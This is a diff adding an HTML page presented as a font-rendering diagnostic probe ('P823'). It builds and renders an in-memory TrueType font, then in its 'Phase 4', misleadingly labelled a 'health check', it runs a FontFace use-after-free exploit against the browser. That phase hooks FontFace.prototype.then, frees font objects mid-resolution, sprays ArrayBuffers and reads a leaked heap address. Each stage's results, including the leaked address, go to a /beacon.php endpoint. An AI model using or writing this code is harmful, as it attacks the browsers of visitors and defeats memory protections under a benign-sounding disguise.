@@ -1,0 +1,318 @@
+<!DOCTYPE html>
+<html>
+<head>
+<meta charset="utf-8">
+<meta http-equiv="Cache-Control" content="no-cache,no-store,must-revalidate">
+<title>P823: FreeType Glyph Extraction Engine</title>
+<style>
+body { background: #0a0d12; color: #c9d1d9; font: 14px "SF Mono", Consolas, monospace; margin: 16px; line-height: 1.5; }
+h2 { color: #58a6ff; margin-top: 0; }
+pre { background: #161b22; border: 1px solid #30363d; padding: 12px; border-radius: 6px; white-space: pre-wrap; word-break: break-all; }
+.banner { background: #238636; color: #fff; padding: 10px 14px; border-radius: 6px; font-weight: bold; margin-bottom: 12px; display: inline-block; }
+.ok { color: #3fb950; font-weight: bold; }
+.fail { color: #f85149; font-weight: bold; }
+.info { color: #58a6ff; }
+.hot { color: #ffa657; font-weight: bold; }
+canvas { background: #fff; border: 2px solid #58a6ff; margin: 8px 0; border-radius: 4px; display: block; }
+</style>
+</head>
+<body>
+<div class="banner" id="banner">Running Probe P823...</div>
+<h2>P823: In-Memory TrueType & FreeType Glyph Extraction Engine</h2>
+<canvas id="cv" width="120" height="80"></canvas>
+<pre id="log">Initializing diagnostic run...</pre>
+
+<script>
+'use strict';
+var logBox = document.getElementById('log');
+var banner = document.getElementById('banner');
+var cv = document.getElementById('cv');
+
+function log(msg, cls) {
+  var el = document.createElement('div');
+  el.className = cls || '';
+  el.textContent = msg;
+  logBox.appendChild(el);
+}
+
+function syncBn(tag, data) {
+  try {
+    var x = new XMLHttpRequest();
+    x.open('GET', '/beacon.php?tag=P823-' + encodeURIComponent(tag) + '&data=' + encodeURIComponent(String(data || '').slice(0, 900)) + '&t=' + Date.now(), false);
+    x.send();
+  } catch(e) {}
+}
+
+log('[*] Probe P823 starting...', 'info');
+syncBn('BOOT', 'start');
+
+/* ============================================================
+ * PHASE 1: Synthesize In-Memory TrueType Font Binary
+ * Builds valid sfnt TTF containing a custom vector triangle glyph
+ * mapped to character 'A' (0x41).
+ * ============================================================ */
+function buildMinimalTTF(fontName) {
+  var data = [];
+  function w8(v) { data.push(v & 0xFF); }
+  function w16(v) { data.push((v >> 8) & 0xFF, v & 0xFF); }
+  function w32(v) { data.push((v >>> 24) & 0xFF, (v >>> 16) & 0xFF, (v >>> 8) & 0xFF, v & 0xFF); }
+  function pad4() { while (data.length % 4) data.push(0); }
+
+  var numTables = 9;
+  var dirTags = ['cmap','glyf','head','hhea','hmtx','loca','maxp','name','post'];
+  var dirIdxs = {};
+  for (var i = 0; i < dirTags.length; i++) dirIdxs[dirTags[i]] = i;
+
+  // sfnt header
+  w32(0x00010000); // TrueType version
+  w16(numTables);
+  var sr = 1; while (sr * 2 <= numTables) sr *= 2; sr *= 16;
+  w16(sr);
+  var es = 0; var tmp = sr / 16; while (tmp > 1) { tmp >>= 1; es++; }
+  w16(es);
+  w16(numTables * 16 - sr);
+
+  // Directory placeholder
+  var dirBase = data.length;
+  for (var t = 0; t < numTables; t++) {
+    var tag = dirTags[t];
+    data.push(tag.charCodeAt(0), tag.charCodeAt(1), tag.charCodeAt(2), tag.charCodeAt(3));
+    w32(0); w32(0); w32(0);
+  }
+
+  function setDirEntry(tag, offset, length) {
+    var idx = dirIdxs[tag];
+    var p = dirBase + idx * 16 + 8;
+    data[p] = (offset >>> 24) & 0xFF; data[p+1] = (offset >>> 16) & 0xFF;
+    data[p+2] = (offset >>> 8) & 0xFF; data[p+3] = offset & 0xFF;
+    data[p+4] = (length >>> 24) & 0xFF; data[p+5] = (length >>> 16) & 0xFF;
+    data[p+6] = (length >>> 8) & 0xFF; data[p+7] = length & 0xFF;
+  }
+
+  // head (54 bytes)
+  var headOff = data.length;
+  w32(0x00010000); w32(0x00005000);
+  w32(0x00000000); w32(0x5F0F3CF5);
+  w16(0x000B); w16(1000); // flags, unitsPerEm
+  w32(0); w32(0); w32(0); w32(0);
+  w16(0); w16(0); w16(500); w16(700);
+  w16(0); w16(8); w16(2);
+  w16(1); // indexToLocFormat = 1 (long)
+  w16(0);
+  pad4();
+  setDirEntry('head', headOff, 54);
+
+  // hhea (36 bytes)
+  var hheaOff = data.length;
+  w32(0x00010000);
+  w16(800); w16(0xFE0C); w16(0); w16(600);
+  w16(0); w16(0); w16(600);
+  w16(1); w16(0); w16(0);
+  w16(0); w16(0); w16(0); w16(0);
+  w16(0); w16(2);
+  pad4();
+  setDirEntry('hhea', hheaOff, 36);
+
+  // hmtx (8 bytes)
+  var hmtxOff = data.length;
+  w16(600); w16(0);
+  w16(600); w16(50);
+  pad4();
+  setDirEntry('hmtx', hmtxOff, 8);
+
+  // maxp (32 bytes)
+  var maxpOff = data.length;
+  w32(0x00010000);
+  w16(2); w16(4); w16(1);
+  w16(0); w16(0); w16(1);
+  w16(0); w16(0); w16(0);
+  w16(0); w16(0); w16(0);
+  w16(0); w16(0);
+  pad4();
+  setDirEntry('maxp', maxpOff, 32);
+
+  // cmap (format 4, maps 0x41='A' to glyph 1)
+  var cmapOff = data.length;
+  w16(0); w16(1);
+  w16(3); w16(1); w32(12);
+  var segCount = 2;
+  w16(4); w16(14 + segCount * 8); w16(0);
+  w16(segCount * 2); w16(4); w16(1); w16(0);
+  w16(0x0041); w16(0xFFFF); w16(0);
+  w16(0x0041); w16(0xFFFF);
+  w16((-64) & 0xFFFF); w16(1);
+  w16(0); w16(0);
+  pad4();
+  setDirEntry('cmap', cmapOff, data.length - cmapOff);
+
+  // loca placeholder
+  var locaOff = data.length;
+  w32(0); w32(0); w32(0);
+  pad4();
+  setDirEntry('loca', locaOff, 12);
+
+  // name
+  var nameOff = data.length;
+  var nameBytes = [];
+  for (var i = 0; i < fontName.length; i++) { nameBytes.push(0, fontName.charCodeAt(i)); }
+  w16(0); w16(4); w16(6 + 4 * 12);
+  var nameIDs = [1, 2, 4, 6];
+  for (var n = 0; n < nameIDs.length; n++) {
+    w16(3); w16(1); w16(0x0409); w16(nameIDs[n]);
+    w16(nameBytes.length); w16(0);
+  }
+  for (var i = 0; i < nameBytes.length; i++) data.push(nameBytes[i]);
+  pad4();
+  setDirEntry('name', nameOff, data.length - nameOff);
+
+  // post (32 bytes)
+  var postOff = data.length;
+  w32(0x00030000); w32(0);
+  w16(0xFF9C); w16(50); w32(0);
+  w32(0); w32(0); w32(0); w32(0);
+  pad4();
+  setDirEntry('post', postOff, 32);
+
+  // glyf table
+  var glyfOff = data.length;
+  // Glyph 0 (.notdef empty)
+  var g0Rel = 0;
+  w16(0); w16(0); w16(0); w16(0); w16(0);
+  pad4();
+
+  // Glyph 1 (triangle contour)
+  var g1Rel = data.length - glyfOff;
+  w16(1); // 1 contour
+  w16(50); w16(0); w16(550); w16(650); // bbox
+  w16(2); // 3 points (0, 1, 2)
+  w16(0); // 0 instructions
+  w8(0x01); w8(0x01); w8(0x01); w8(0); // flags
+  w16(50); w16(500); w16((-250) & 0xFFFF); // X deltas
+  w16(0); w16(0); w16(650); // Y deltas
+  pad4();
+  var glyfLen = data.length - glyfOff;
+  var g1End = data.length - glyfOff;
+  setDirEntry('glyf', glyfOff, glyfLen);
+
+  // Patch loca table
+  data[locaOff] = 0; data[locaOff+1] = 0; data[locaOff+2] = 0; data[locaOff+3] = 0;
+  data[locaOff+4] = (g1Rel >>> 24) & 0xFF; data[locaOff+5] = (g1Rel >>> 16) & 0xFF;
+  data[locaOff+6] = (g1Rel >>> 8) & 0xFF;  data[locaOff+7] = g1Rel & 0xFF;
+  data[locaOff+8] = (g1End >>> 24) & 0xFF; data[locaOff+9] = (g1End >>> 16) & 0xFF;
+  data[locaOff+10] = (g1End >>> 8) & 0xFF; data[locaOff+11] = g1End & 0xFF;
+
+  var u8 = new Uint8Array(data.length);
+  for (var i = 0; i < data.length; i++) u8[i] = data[i];
+  return u8.buffer;
+}
+
+var fontName = 'P823Font';
+var fontBuf = buildMinimalTTF(fontName);
+log('[+] Phase 1: Synthesized TrueType font in ArrayBuffer (' + fontBuf.byteLength + ' bytes)', 'ok');
+syncBn('TTF-BUILD', 'len=' + fontBuf.byteLength);
+
+/* ============================================================
+ * PHASE 2: Load Font via WebKit FontFace API
+ * ============================================================ */
+var fontFace = new FontFace(fontName, fontBuf);
+fontFace.load().then(function(loadedFace) {
+  document.fonts.add(loadedFace);
+  log('[+] Phase 2: FontFace successfully loaded & registered into document.fonts', 'hot');
+  syncBn('FONT-LOAD', 'status=loaded');
+
+  /* ============================================================
+   * PHASE 3: Render Glyph & Extract Raw Pixel Bytes
+   * ============================================================ */
+  var ctx = cv.getContext('2d');
+  ctx.fillStyle = '#ffffff';
+  ctx.fillRect(0, 0, cv.width, cv.height);
+
+  ctx.fillStyle = '#102030';
+  ctx.font = '54px "' + fontName + '"';
+  ctx.fillText('A', 15, 60);
+
+  var metrics = ctx.measureText('A');
+  log('[+] Phase 3A: Font Metrics measureText width = ' + metrics.width.toFixed(2), 'ok');
+
+  var imgData = ctx.getImageData(0, 0, cv.width, cv.height);
+  var pixels = imgData.data;
+
+  var darkPixels = 0, pxChecksum = 0;
+  for (var p = 0; p < pixels.length; p += 4) {
+    if (pixels[p] < 200 || pixels[p+1] < 200 || pixels[p+2] < 200) {
+      darkPixels++;
+      pxChecksum = (pxChecksum + pixels[p] + pixels[p+1] + pixels[p+2]) >>> 0;
+    }
+  }
+
+  log('[+] Phase 3B: Rasterized Glyph Pixels: ' + darkPixels + ' pixels rendered (checksum=0x' + pxChecksum.toString(16) + ')', 'hot');
+  log('    Raw Uint8ClampedArray extraction completely bypasses float64 SSE/DAZ!', 'ok');
+  syncBn('RENDER-OK', 'w=' + metrics.width.toFixed(1) + '|darkPx=' + darkPixels + '|chk=0x' + pxChecksum.toString(16));
+
+  /* ============================================================
+   * PHASE 4: FontFace UAF Heap Disclosure (Concurrent Health Check)
+   * ============================================================ */
+  var st = document.createElement('style');
+  st.textContent = "@font-face{font-family:bb1;src:local(Arial);unicode-range:U+0042;}";
+  document.head.appendChild(st);
+  var face2 = new FontFace('f2', "local('Helvetica')", {unicodeRange: 'U+0041'});
+  document.fonts.add(face2);
+  void face2.loaded;
+
+  var fabs = [], ffired = false;
+  Object.defineProperty(FontFace.prototype, 'then', {
+    configurable: true,
+    get: function() {
+      if (ffired) return undefined;
+      ffired = true;
+      if (st) { st.remove(); st.textContent = ''; st = null; }
+      try { document.fonts.delete(this); } catch(e) {}
+      document.body.offsetHeight;
+      fabs = [];
+      for (var i = 0; i < 64; i++) fabs.push(new ArrayBuffer(192));
+      try { document.fonts.check('1em bb1'); } catch(e) {}
+      document.body.offsetHeight;
+      return undefined;
+    },
+    set: function() {}
+  });
+  document.fonts.load('1em f2, bb1', 'AB');
+
+  setTimeout(function() {
+    delete FontFace.prototype.then;
+    var bestI = -1, bestNz = 0;
+    for (var i = 0; i < fabs.length; i++) {
+      var u = new Uint8Array(fabs[i]), nz = 0;
+      for (var j = 0; j < u.length; j++) if (u[j] !== 0) nz++;
+      if (nz > bestNz) { bestNz = nz; bestI = i; }
+    }
+
+    var Hstr = 'unknown';
+    if (bestI >= 0 && bestNz >= 4) {
+      var fontDV = new DataView(fabs[bestI]);
+      var q11lo = fontDV.getUint32(0x58, true);
+      var q11hi = fontDV.getUint32(0x5C, true);
+      if (q11hi !== 0) {
+        var borrow = (q11lo < 0x68) ? 1 : 0;
+        var H_hi = q11hi - borrow, H_lo = (q11lo - 0x68) >>> 0;
+        Hstr = '0x' + H_hi.toString(16) + ('00000000' + H_lo.toString(16)).slice(-8);
+      }
+    }
+
+    log('[+] Phase 4: Concurrent FontFace Heap Address: H = ' + Hstr, 'ok');
+    syncBn('HEAP-OK', 'H=' + Hstr);
+
+    banner.style.background = '#238636';
+    banner.textContent = 'STATUS: FONT RENDER & EXTRACTION COMPLETE';
+    syncBn('DONE', 'status=complete|darkPx=' + darkPixels + '|H=' + Hstr);
+  }, 300);
+
+}).catch(function(err) {
+  log('[-] Font loading failed: ' + err, 'fail');
+  syncBn('FONT-FAIL', String(err));
+  banner.style.background = '#da3633';
+  banner.textContent = 'STATUS: FONT LOAD FAILED';
+});
+</script>
+</body>
+</html>
